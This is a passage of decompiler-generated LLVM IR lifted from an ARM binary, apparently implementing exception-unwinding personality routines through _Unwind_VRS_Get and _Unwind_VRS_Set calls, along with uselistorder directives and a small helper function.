  %tmp206 = bitcast i32 %v2_22664 to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_2266c = bitcast float %tmp207 to i32
  store i32 %v1_2266c, i32* @sl, align 4
  br i1 %v2_2259c, label %dec_label_pc_22674, label %dec_label_pc_227e0

dec_label_pc_22674:                               ; preds = %dec_label_pc_22660
  %v2_22674 = icmp eq i32 %v0_2272c, 0
  br i1 %v2_22674, label %dec_label_pc_227c8, label %dec_label_pc_2267c

dec_label_pc_2267c:                               ; preds = %dec_label_pc_22674
  %v2_22680 = icmp eq i32 %v1_2266c, 0
  br i1 %v2_22680, label %dec_label_pc_2268c.thread, label %bb159

dec_label_pc_2268c.thread:                        ; preds = %dec_label_pc_2267c
  br label %dec_label_pc_228f0

bb159:                                            ; preds = %dec_label_pc_2267c
  br i1 %v3_22684, label %dec_label_pc_22694, label %dec_label_pc_227c8

dec_label_pc_22694:                               ; preds = %bb159
  %v1_22694 = add i32 %v0_22664, 4
  store i32 %v1_22694, i32* @r6, align 4
  store i32 112, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_226a4 = load i32, i32* @r8, align 4
  %v1_226a4 = add i32 %v0_226a4, 88
  store i32 %v1_226a4, i32* %sb.global-to-local, align 4
  store i32 %v1_22694, i32* @r4, align 4
  br label %dec_label_pc_226c8

dec_label_pc_226b8:                               ; preds = %bb161
  %v1_226b8 = add i32 %v0_226b8, 1
  store i32 %v1_226b8, i32* @r5, align 4
  %v1_226bc = load i32, i32* @sl, align 4
  %v9_226bc = icmp eq i32 %v1_226b8, %v1_226bc
  %v0_226c0 = load i32, i32* @r4, align 4
  %v1_226c0 = add i32 %v0_226c0, 4
  store i32 %v1_226c0, i32* @r4, align 4
  br i1 %v9_226bc, label %dec_label_pc_228f0, label %dec_label_pc_226b8.dec_label_pc_226c8_crit_edge

dec_label_pc_226b8.dec_label_pc_226c8_crit_edge:  ; preds = %dec_label_pc_226b8
  %v0_226d4.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_226c8

dec_label_pc_226c8:                               ; preds = %dec_label_pc_226b8.dec_label_pc_226c8_crit_edge, %dec_label_pc_22694
  %v0_226d4 = phi i32 [ %v0_226d4.pre, %dec_label_pc_226b8.dec_label_pc_226c8_crit_edge ], [ %v1_226a4, %dec_label_pc_22694 ]
  %v1_226d8 = phi i32 [ %v1_226c0, %dec_label_pc_226b8.dec_label_pc_226c8_crit_edge ], [ %v1_22694, %dec_label_pc_22694 ]
  %v1_226c8 = inttoptr i32 %v1_226d8 to i32*
  %v2_226c8 = load i32, i32* %v1_226c8, align 4
  %v2_226cc = icmp eq i32 %v2_226c8, 0
  store i32 %v0_226d4, i32* %forced_unwind_-44, align 4
  br i1 %v2_226cc, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_226c8
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_226c8, %bb160
  %v0_226dc = load i32, i32* @r8, align 4
  store i32 %v0_226dc, i32* %r0.global-to-local, align 4
  store i32 %v2_22768, i32* %r2.global-to-local, align 4
  %v4_226ec = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 112) to i32*), align 4
  store i32 141048, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_226ec)
  %v0_226f8 = load i32, i32* %r0.global-to-local, align 4
  %v2_226f8 = icmp eq i32 %v0_226f8, 0
  %v0_226b8 = load i32, i32* @r5, align 4
  br i1 %v2_226f8, label %dec_label_pc_226b8, label %dec_label_pc_22700

dec_label_pc_22700:                               ; preds = %bb161
  %v1_22700 = load i32, i32* @sl, align 4
  %v9_22700 = icmp eq i32 %v0_226b8, %v1_22700
  br i1 %v9_22700, label %dec_label_pc_228f0, label %dec_label_pc_22708

dec_label_pc_22708:                               ; preds = %dec_label_pc_22700
  %v0_22708 = load i32, i32* @r7, align 4
  %v1_22708 = inttoptr i32 %v0_22708 to i32*
  %v2_22708 = load i32, i32* %v1_22708, align 4
  %v1_2270c = icmp slt i32 %v2_22708, 0
  %v0_22714.pre = load i32, i32* @r6, align 4
  br i1 %v1_2270c, label %dec_label_pc_22714, label %dec_label_pc_227d4

dec_label_pc_22714:                               ; preds = %dec_label_pc_22708, %dec_label_pc_227cc
  %v0_22714 = phi i32 [ %storemerge, %dec_label_pc_227cc ], [ %v0_22714.pre, %dec_label_pc_22708 ]
  store i32 %v0_22714, i32* %r0.global-to-local, align 4
  %v1_22718 = add i32 %v0_22714, 4
  store i32 %v1_22718, i32* @r6, align 4
  br label %dec_label_pc_227d4

dec_label_pc_22720:                               ; preds = %bb154
  store i32 %v1_224a0, i32* %r2.global-to-local, align 4
  br i1 %v2_2259c, label %dec_label_pc_2272c, label %dec_label_pc_22818

dec_label_pc_2272c:                               ; preds = %dec_label_pc_22720
  %v2_2272c = icmp eq i32 %v0_2272c, 0
  br i1 %v2_2272c, label %dec_label_pc_22798, label %dec_label_pc_22734

dec_label_pc_22734:                               ; preds = %dec_label_pc_2272c
  %v0_22734 = load i32, i32* @r7, align 4
  %v1_22734 = add i32 %v0_22734, 4
  %v2_22734 = inttoptr i32 %v1_22734 to i32*
  %v3_22734 = load i32, i32* %v2_22734, align 4
  %v7_22738 = icmp eq i32 %v3_22734, -2
  store i32 %v1_22734, i32* %r2.global-to-local, align 4
  br i1 %v7_22738, label %dec_label_pc_22650, label %dec_label_pc_22744

dec_label_pc_22744:                               ; preds = %dec_label_pc_22734
  %v0_22744 = load i32, i32* @r8, align 4
  %v1_22744 = add i32 %v0_22744, 88
  %v7_22748 = icmp eq i32 %v3_22734, -1
  store i32 %v1_22744, i32* %forced_unwind_-44, align 4
  br i1 %v7_22748, label %dec_label_pc_2278c, label %dec_label_pc_22754

dec_label_pc_22754:                               ; preds = %dec_label_pc_22744
  %v2_22758 = icmp eq i32 %v3_22734, 0
  br i1 %v2_22758, label %bb163, label %bb162

bb162:                                            ; preds = %dec_label_pc_22754
  br label %bb163

bb163:                                            ; preds = %dec_label_pc_22754, %bb162
  store i32 %v0_22744, i32* %r0.global-to-local, align 4
  store i32 %v2_22768, i32* %r2.global-to-local, align 4
  %v4_22774 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 112) to i32*), align 4
  store i32 141184, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_22774)
  %v0_22780 = load i32, i32* %r0.global-to-local, align 4
  %v2_22780 = icmp eq i32 %v0_22780, 0
  br i1 %v2_22780, label %bb164, label %.thread25

.thread25:                                        ; preds = %bb163
  %v3_2278c.pr = load i32, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_2278c

bb164:                                            ; preds = %bb163
  store i32 0, i32* %forced_unwind_-44, align 4
  br label %dec_label_pc_22798

dec_label_pc_2278c:                               ; preds = %.thread25, %dec_label_pc_22744
  %v3_2278c = phi i32 [ %v3_2278c.pr, %.thread25 ], [ %v1_22744, %dec_label_pc_22744 ]
  %v2_22790 = icmp eq i32 %v3_2278c, 0
  br i1 %v2_22790, label %dec_label_pc_22798, label %dec_label_pc_228f0

dec_label_pc_22798:                               ; preds = %bb164, %dec_label_pc_22844, %dec_label_pc_22818, %dec_label_pc_2278c, %dec_label_pc_2272c
  %v0_22798 = load i32, i32* @r7, align 4
  %v1_22798 = add i32 %v0_22798, 8
  %v1_22500 = inttoptr i32 %v1_22798 to i32*
  %v2_22500 = load i32, i32* %v1_22500, align 4
  %v2_22504 = icmp eq i32 %v2_22500, 0
  br i1 %v2_22504, label %dec_label_pc_225c0, label %dec_label_pc_2250c.preheader

dec_label_pc_227a0:                               ; preds = %entry
  %v3_227a0 = udiv i32 %v2_22494, 65536
  store i32 2, i32* %r2.global-to-local, align 4
  %v6_227b0 = mul nuw nsw i32 %v3_227a0, 4
  %v3_227b4 = mul i32 %v2_22494, 65536
  %v2_227b8 = add i32 %v6_227b0, %v4_22494
  store i32 %v3_227b4, i32* %v4_224b4, align 8
  br label %dec_label_pc_224dc

dec_label_pc_227c8:                               ; preds = %bb159, %dec_label_pc_22674
  %v1_227c8 = add i32 %v0_22664, 4
  br label %dec_label_pc_227cc

dec_label_pc_227cc:                               ; preds = %dec_label_pc_2280c, %dec_label_pc_227c8
  %v0_227cc = phi i32 [ %v2_2280c, %dec_label_pc_2280c ], [ %v2_22664, %dec_label_pc_227c8 ]
  %storemerge = phi i32 [ %v4_2280c, %dec_label_pc_2280c ], [ %v1_227c8, %dec_label_pc_227c8 ]
  store i32 %storemerge, i32* @r6, align 4
  %v1_227cc = icmp slt i32 %v0_227cc, 0
  br i1 %v1_227cc, label %dec_label_pc_22714, label %dec_label_pc_227d4

dec_label_pc_227d4:                               ; preds = %dec_label_pc_22708, %dec_label_pc_227cc, %dec_label_pc_228e0, %dec_label_pc_22714
  %v0_227d8 = phi i32 [ %v1_22718, %dec_label_pc_22714 ], [ %storemerge, %dec_label_pc_227cc ], [ %v1_228e4, %dec_label_pc_228e0 ], [ %v0_22714.pre, %dec_label_pc_22708 ]
  %stack_var_-76.4 = phi i32 [ %stack_var_-76.2.ph3175, %dec_label_pc_22714 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_227cc ], [ %v1_228e0, %dec_label_pc_228e0 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_22708 ]
  %v0_227d4 = load i32, i32* @sl, align 4
  %v3_227d4 = mul i32 %v0_227d4, 4
  %v2_227d8 = add i32 %v3_227d4, %v0_227d8
  %v1_2250065 = inttoptr i32 %v2_227d8 to i32*
  %v2_2250066 = load i32, i32* %v1_2250065, align 4
  %v2_2250468 = icmp eq i32 %v2_2250066, 0
  br i1 %v2_2250468, label %dec_label_pc_225c0, label %dec_label_pc_2250c.preheader.lr.ph

dec_label_pc_227e0:                               ; preds = %dec_label_pc_22660
  %v0_227f0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_227f0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_227f8 = load i32, i32* @r8, align 4
  %v1_227f8 = add i32 %v0_227f8, 32
  %v2_227f8 = inttoptr i32 %v1_227f8 to i32*
  %v3_227f8 = load i32, i32* %v2_227f8, align 4
  store i32 %v3_227f8, i32* @r4, align 4
  %v5_227fc = call i32 @_Unwind_VRS_Get(i32 %v0_227f0, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_227fc, i32* %r0.global-to-local, align 4
  %v3_22800 = load i32, i32* %stack_var_-48, align 4
  %v0_22804 = load i32, i32* @r4, align 4
  %v9_22804 = icmp eq i32 %v0_22804, %v3_22800
  br i1 %v9_22804, label %dec_label_pc_228ac, label %dec_label_pc_227e0.dec_label_pc_2280c_crit_edge

dec_label_pc_227e0.dec_label_pc_2280c_crit_edge:  ; preds = %dec_label_pc_227e0
  %v0_2280c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_2280c

dec_label_pc_2280c:                               ; preds = %dec_label_pc_227e0.dec_label_pc_2280c_crit_edge, %dec_label_pc_228ac
  %v0_2280c = phi i32 [ %v0_2280c.pre, %dec_label_pc_227e0.dec_label_pc_2280c_crit_edge ], [ %v1_228b0, %dec_label_pc_228ac ]
  %v1_2280c = inttoptr i32 %v0_2280c to i32*
  %v2_2280c = load i32, i32* %v1_2280c, align 4
  %v4_2280c = add i32 %v0_2280c, 4
  store i32 %v4_2280c, i32* @r7, align 4
  br label %dec_label_pc_227cc

dec_label_pc_22818:                               ; preds = %dec_label_pc_22720
  %v0_22828 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22828, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_22830 = load i32, i32* @r8, align 4
  %v1_22830 = add i32 %v0_22830, 32
  %v2_22830 = inttoptr i32 %v1_22830 to i32*
  %v3_22830 = load i32, i32* %v2_22830, align 4
  store i32 %v3_22830, i32* @r4, align 4
  %v5_22834 = call i32 @_Unwind_VRS_Get(i32 %v0_22828, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_22834, i32* %r0.global-to-local, align 4
  %v3_22838 = load i32, i32* %stack_var_-48, align 4
  %v0_2283c = load i32, i32* @r4, align 4
  %v9_2283c = icmp eq i32 %v0_2283c, %v3_22838
  br i1 %v9_2283c, label %dec_label_pc_22844, label %dec_label_pc_22798

dec_label_pc_22844:                               ; preds = %dec_label_pc_22818
  %v0_22844 = load i32, i32* @r8, align 4
  %v1_22844 = add i32 %v0_22844, 40
  %v2_22844 = inttoptr i32 %v1_22844 to i32*
  %v3_22844 = load i32, i32* %v2_22844, align 4
  %v1_22848 = load i32, i32* @r7, align 4
  %v9_22848 = icmp eq i32 %v3_22844, %v1_22848
  br i1 %v9_22848, label %dec_label_pc_22850, label %dec_label_pc_22798

dec_label_pc_22850:                               ; preds = %dec_label_pc_22844
  %v1_22850 = inttoptr i32 %v3_22844 to i32*
  %v2_22850 = load i32, i32* %v1_22850, align 4
  %v1_22854 = and i32 %v2_22850, 1073741824
  %v2_22854 = icmp eq i32 %v1_22854, 0
  br i1 %v2_22854, label %.thread26, label %bb165

bb165:                                            ; preds = %dec_label_pc_22850
  %v2_22858 = or i32 %v2_22850, -2147483648
  br label %bb166

.thread26:                                        ; preds = %dec_label_pc_22850
  %tmp208 = bitcast i32 %v2_22850 to float
  %tmp209 = call float @fabsf(float %tmp208)
  %v2_2285c = bitcast float %tmp209 to i32
  br label %bb166

bb166:                                            ; preds = %bb165, %bb169, %.thread28, %.thread26
  %v1_22860 = phi i32 [ %v2_22990, %.thread28 ], [ %v2_22990, %bb169 ], [ %v3_22844, %bb165 ], [ %v3_22844, %.thread26 ]
  %v0_22860 = phi i32 [ %v2_229a0, %.thread28 ], [ %v2_2299c, %bb169 ], [ %v2_22858, %bb165 ], [ %v2_2285c, %.thread26 ]
  %v2_22860 = add i32 %v0_22860, %v1_22860
  store i32 %v2_22860, i32* %stack_var_-48, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_22878 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22878, i32* %r0.global-to-local, align 4
  %v5_22880 = call i32 @_Unwind_VRS_Set(i32 %v0_22878, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v0_22878, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_22898 = load i32, i32* @r8, align 4
  store i32 %v0_22898, i32* %stack_var_-48, align 4
  %v5_228a0 = call i32 @_Unwind_VRS_Set(i32 %v0_22878, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22654

dec_label_pc_228ac:                               ; preds = %dec_label_pc_227e0
  %v0_228ac = load i32, i32* @r8, align 4
  %v1_228ac = add i32 %v0_228ac, 40
  %v2_228ac = inttoptr i32 %v1_228ac to i32*
  %v3_228ac = load i32, i32* %v2_228ac, align 4
  %v1_228b0 = load i32, i32* @r7, align 4
  %v9_228b0 = icmp eq i32 %v3_228ac, %v1_228b0
  br i1 %v9_228b0, label %dec_label_pc_228b8, label %dec_label_pc_2280c

dec_label_pc_228b8:                               ; preds = %dec_label_pc_228ac
  %v1_228bc = add i32 %v3_228ac, 4
  store i32 %v1_228bc, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v2_228c4 = add i32 %v0_228ac, 44
  %v3_228c4 = inttoptr i32 %v2_228c4 to i32*
  store i32 0, i32* %v3_228c4, align 4
  %v0_228c8 = load i32, i32* %r2.global-to-local, align 4
  %v1_228c8 = load i32, i32* @r8, align 4
  %v2_228c8 = add i32 %v1_228c8, 48
  %v3_228c8 = inttoptr i32 %v2_228c8 to i32*
  store i32 %v0_228c8, i32* %v3_228c8, align 4
  %v0_228cc = load i32, i32* @sl, align 4
  %v1_228cc = load i32, i32* @r8, align 4
  %v2_228cc = add i32 %v1_228cc, 40
  %v3_228cc = inttoptr i32 %v2_228cc to i32*
  store i32 %v0_228cc, i32* %v3_228cc, align 4
  %v0_228d0 = load i32, i32* %r0.global-to-local, align 4
  %v1_228d0 = load i32, i32* @r8, align 4
  %v2_228d0 = add i32 %v1_228d0, 52
  %v3_228d0 = inttoptr i32 %v2_228d0 to i32*
  store i32 %v0_228d0, i32* %v3_228d0, align 4
  %v0_228d4 = load i32, i32* @r7, align 4
  %v1_228d4 = inttoptr i32 %v0_228d4 to i32*
  %v2_228d4 = load i32, i32* %v1_228d4, align 4
  %v1_228d8 = icmp slt i32 %v2_228d4, 0
  br i1 %v1_228d8, label %dec_label_pc_228e0, label %dec_label_pc_2298c

dec_label_pc_228e0:                               ; preds = %dec_label_pc_228b8
  %v0_228e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_228e0 = add i32 %v0_228e0, -3
  store i32 %v1_228e0, i32* %r2.global-to-local, align 4
  %v0_228e4 = load i32, i32* %r0.global-to-local, align 4
  %v1_228e4 = add i32 %v0_228e4, 4
  store i32 %v1_228e4, i32* @r6, align 4
  br label %dec_label_pc_227d4

dec_label_pc_228f0:                               ; preds = %dec_label_pc_22700, %dec_label_pc_2278c, %dec_label_pc_226b8, %dec_label_pc_2268c.thread
  store i32 13, i32* %r2.global-to-local, align 4
  %v0_22900 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22900, i32* %r0.global-to-local, align 4
  %v5_22908 = call i32 @_Unwind_VRS_Get(i32 %v0_22900, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_2290c = load i32, i32* @r7, align 4
  %v1_2290c = load i32, i32* @r8, align 4
  %v2_2290c = add i32 %v1_2290c, 40
  %v3_2290c = inttoptr i32 %v2_2290c to i32*
  store i32 %v0_2290c, i32* %v3_2290c, align 4
  %v3_22910 = load i32, i32* %stack_var_-48, align 4
  %v3_22914 = load i32, i32* %forced_unwind_-44, align 4
  store i32 %v3_22914, i32* %r2.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_2291c = load i32, i32* @r8, align 4
  %v2_2291c = add i32 %v1_2291c, 32
  %v3_2291c = inttoptr i32 %v2_2291c to i32*
  store i32 %v3_22910, i32* %v3_2291c, align 4
  %v0_22920 = load i32, i32* %r2.global-to-local, align 4
  %v1_22920 = load i32, i32* @r8, align 4
  %v2_22920 = add i32 %v1_22920, 36
  %v3_22920 = inttoptr i32 %v2_22920 to i32*
  store i32 %v0_22920, i32* %v3_22920, align 4
  %v1_2265c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22654

dec_label_pc_22928:                               ; preds = %bb155
  %v1_22928 = inttoptr i32 %v0_225b0 to i32*
  %v2_22928 = load i32, i32* %v1_22928, align 4
  %v1_2292c = add i32 %v0_225b0, 4
  %v1_22930 = and i32 %v2_22928, 1073741824
  %v2_22930 = icmp eq i32 %v1_22930, 0
  %v2_22934 = or i32 %v2_22928, -2147483648
  %tmp210 = bitcast i32 %v2_22928 to float
  %tmp211 = call float @fabsf(float %tmp210)
  %v2_22938 = bitcast float %tmp211 to i32
  %storemerge122 = select i1 %v2_22930, i32 %v2_22938, i32 %v2_22934
  store i32 %storemerge122, i32* %r4.global-to-local, align 4
  %v1_2293c = load i32, i32* @r8, align 4
  %v2_2293c = add i32 %v1_2293c, 56
  %v3_2293c = inttoptr i32 %v2_2293c to i32*
  store i32 %v1_2292c, i32* %v3_2293c, align 4
  %v0_22940 = load i32, i32* @r8, align 4
  store i32 %v0_22940, i32* %r0.global-to-local, align 4
  %v4_2294c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 36) to i32*), align 4
  store i32 141656, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_2294c)
  %v0_22958 = load i32, i32* %r0.global-to-local, align 4
  %v2_22958 = icmp eq i32 %v0_22958, 0
  br i1 %v2_22958, label %dec_label_pc_22650, label %dec_label_pc_22960

dec_label_pc_22960:                               ; preds = %dec_label_pc_22928
  %v0_22960 = load i32, i32* %r4.global-to-local, align 4
  %v1_22960 = load i32, i32* @r7, align 4
  %v2_22960 = add i32 %v1_22960, %v0_22960
  store i32 %v2_22960, i32* %stack_var_-48, align 4
  %v0_22970 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_22970, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v5_22980 = call i32 @_Unwind_VRS_Set(i32 %v0_22970, i32 0, i32 15, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22654

dec_label_pc_2298c:                               ; preds = %dec_label_pc_228b8
  %v0_2298c = load i32, i32* @sl, align 4
  %v3_2298c = mul i32 %v0_2298c, 4
  %v0_22990 = load i32, i32* %r0.global-to-local, align 4
  %v2_22990 = add i32 %v0_22990, %v3_2298c
  %v3_22990 = inttoptr i32 %v2_22990 to i32*
  %v4_22990 = load i32, i32* %v3_22990, align 4
  %v1_22994 = and i32 %v4_22990, 1073741824
  %v2_22994 = icmp eq i32 %v1_22994, 0
  br i1 %v2_22994, label %.thread28, label %bb169

bb169:                                            ; preds = %dec_label_pc_2298c
  %v2_2299c = or i32 %v4_22990, -2147483648
  br label %bb166

.thread28:                                        ; preds = %dec_label_pc_2298c
  %tmp212 = bitcast i32 %v4_22990 to float
  %tmp213 = call float @fabsf(float %tmp212)
  %v2_229a0 = bitcast float %tmp213 to i32
  br label %bb166

; uselistorder directives
  uselistorder i32 %v2_22990, { 2, 1, 0 }
  uselistorder i32 %v1_228e4, { 1, 0 }
  uselistorder i32 %v1_228e0, { 1, 0 }
  uselistorder i32 %v1_228b0, { 1, 0 }
  uselistorder i32 %v0_22878, { 1, 0, 2, 3 }
  uselistorder i32 %v3_22844, { 1, 2, 0, 3 }
  uselistorder i32 %v4_2280c, { 1, 0 }
  uselistorder i32 %v0_2280c, { 1, 0 }
  uselistorder i32 %v2_2250066, { 1, 0 }
  uselistorder i32 %v2_227d8, { 1, 0 }
  uselistorder i32 %stack_var_-76.4, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v2_22500, { 1, 0 }
  uselistorder i32 %v1_22798, { 1, 0 }
  uselistorder i32 %v3_22734, { 2, 0, 1 }
  uselistorder i32 %v0_22714, { 1, 0 }
  uselistorder i32 %v0_22714.pre, { 1, 0 }
  uselistorder i32 %v1_2266c, { 1, 0 }
  uselistorder i32 %v2_22664, { 1, 0 }
  uselistorder i32 %v0_225f4, { 1, 0, 2, 3 }
  uselistorder i32 %stack_var_-76.3, { 1, 0 }
  uselistorder i32 %v2_225b4, { 1, 0 }
  uselistorder i32 %v1_225b0, { 1, 0 }
  uselistorder i32 %v0_225b0, { 1, 0, 2 }
  uselistorder i32 %v4_22588, { 0, 2, 1, 3 }
  uselistorder i32 %v0_2272c, { 1, 2, 0 }
  uselistorder i32 %v0_22560, { 1, 0 }
  uselistorder i32 %v3_2255c, { 1, 0, 2 }
  uselistorder i32 %v1_22530, { 0, 2, 4, 1, 3 }
  uselistorder i32 %stack_var_-76.2.ph3175, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v2_22768, { 1, 0 }
  uselistorder i1 %v2_2259c, { 1, 0, 2 }
  uselistorder i32 %v1_224a0, { 4, 3, 1, 2, 6, 5, 0 }
  uselistorder i32* %stack_var_-48, { 1, 2, 3, 4, 5, 6, 7, 0, 9, 8 }
  uselistorder %anon_struct_4* %uws_-60, { 1, 0 }
  uselistorder i32* %forced_unwind_-44, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 0 }
  uselistorder i32* %r0.global-to-local, { 8, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 13, 12, 14, 16, 15, 24, 17, 18, 19, 20, 21, 22, 23, 26, 25, 28, 27, 29, 30, 32, 31, 35, 33, 34, 0 }
  uselistorder i32* %fp.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32 6, { 34, 0, 5, 26, 27, 4, 21, 22, 28, 29, 30, 31, 6, 7, 33, 3, 1, 8, 32, 2, 9, 10, 11, 12, 13, 14, 23, 15, 16, 18, 19, 20, 17, 24, 25 }
  uselistorder i32 -3, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 52, { 41, 2, 1, 6, 8, 34, 30, 25, 9, 10, 11, 32, 28, 33, 31, 29, 12, 13, 3, 14, 15, 16, 17, 4, 18, 19, 20, 36, 37, 5, 38, 0, 7, 23, 39, 40, 21, 22, 35, 26, 27, 24 }
  uselistorder i32 48, { 36, 6, 7, 26, 1, 17, 8, 22, 23, 18, 19, 2, 25, 27, 9, 28, 29, 3, 10, 30, 11, 31, 24, 12, 13, 14, 4, 0, 33, 34, 35, 32, 20, 21, 15, 16, 5 }
  uselistorder i32 44, { 42, 15, 16, 21, 22, 17, 2, 43, 44, 1, 3, 18, 19, 0, 20, 4, 26, 27, 28, 29, 30, 31, 23, 24, 25, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13 }
  uselistorder i32 -2147483648, { 24, 25, 26, 27, 28, 29, 30, 31, 2, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 6, 7, 18, 19, 5, 0, 1, 4, 20, 21, 22, 23 }
  uselistorder i32 1073741824, { 8, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4, 5, 6, 7, 0, 1 }
  uselistorder i32 65536, { 1, 2, 3, 4, 5, 6, 0, 7, 8, 9, 10, 11, 12, 13, 17, 14, 18, 15, 19, 16, 20, 22, 21, 23, 69, 67, 68, 66, 70, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 35, 34, 36, 38, 37, 39, 40, 41, 42, 43, 44, 46, 45, 47, 50, 49, 48, 51, 52, 53, 56, 55, 54, 57, 59, 60, 58, 61, 63, 64, 62, 65 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_32024.1324 to i32), i32 112) to i32*), { 1, 0 }
  uselistorder i32 88, { 20, 21, 18, 2, 19, 15, 16, 0, 3, 5, 4, 6, 1, 7, 8, 9, 10, 11, 13, 12, 14, 17 }
  uselistorder i32 112, { 0, 3, 4, 7, 1, 8, 5, 2, 9, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_32024.1324 to i32), { 49, 8, 50, 51, 9, 10, 93, 126, 127, 94, 95, 96, 128, 11, 12, 97, 129, 2, 130, 131, 132, 133, 134, 135, 136, 3, 4, 0, 5, 98, 99, 137, 13, 100, 138, 14, 15, 16, 17, 18, 61, 60, 62, 139, 140, 48, 101, 141, 102, 142, 23, 25, 20, 21, 24, 19, 22, 143, 144, 145, 63, 26, 146, 147, 148, 27, 103, 149, 150, 28, 104, 151, 152, 29, 30, 31, 153, 105, 154, 32, 155, 33, 156, 157, 158, 106, 159, 34, 160, 6, 107, 161, 108, 162, 163, 109, 164, 165, 166, 35, 36, 111, 167, 168, 169, 170, 171, 172, 52, 87, 83, 81, 80, 82, 84, 85, 86, 79, 88, 74, 76, 75, 73, 72, 77, 78, 69, 68, 71, 70, 67, 66, 65, 64, 113, 89, 112, 90, 53, 91, 110, 114, 173, 7, 115, 116, 174, 117, 38, 37, 175, 39, 40, 118, 41, 42, 176, 43, 177, 120, 119, 59, 56, 57, 58, 55, 44, 92, 54, 45, 46, 121, 122, 123, 178, 47, 179, 1, 124, 125 }
  uselistorder i32 -2, { 0, 26, 27, 9, 10, 11, 12, 20, 3, 4, 5, 13, 14, 15, 1, 6, 8, 7, 16, 22, 23, 24, 25, 18, 17, 21, 19, 2 }
  uselistorder i32 80, { 8, 9, 10, 0, 4, 1, 2, 5, 6, 7, 3 }
  uselistorder i32 %ucbp, { 0, 1, 3, 2 }
  uselistorder i32 %state, { 1, 0, 2 }
  uselistorder label %dec_label_pc_228f0, { 1, 0, 2, 3 }
  uselistorder label %bb166, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_2280c, { 1, 0 }
  uselistorder label %dec_label_pc_227d4, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_22798, { 1, 2, 3, 0, 4 }
  uselistorder label %bb163, { 1, 0 }
  uselistorder label %dec_label_pc_22714, { 1, 0 }
  uselistorder label %bb161, { 1, 0 }
  uselistorder label %dec_label_pc_22654, { 1, 2, 3, 5, 4, 0 }
  uselistorder label %dec_label_pc_22650, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_225b0, { 1, 0 }
  uselistorder label %bb154, { 2, 0, 1 }
  uselistorder label %bb152, { 1, 0 }
  uselistorder label %dec_label_pc_2250c, { 1, 0 }
  uselistorder label %dec_label_pc_2250c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_2250c.preheader.lr.ph, { 1, 0 }
  uselistorder label %bb148, { 1, 0 }
}

define i32 @function_229ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_229ac:
  %v0_229ac = load i1, i1* @cpsr_z, align 1
  br i1 %v0_229ac, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_229ac
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_229ac, %bb
  %v4_229b4 = phi i32 [ %arg1, %dec_label_pc_229ac ], [ 0, %bb ]
  ret i32 %v4_229b4

; uselistorder directives
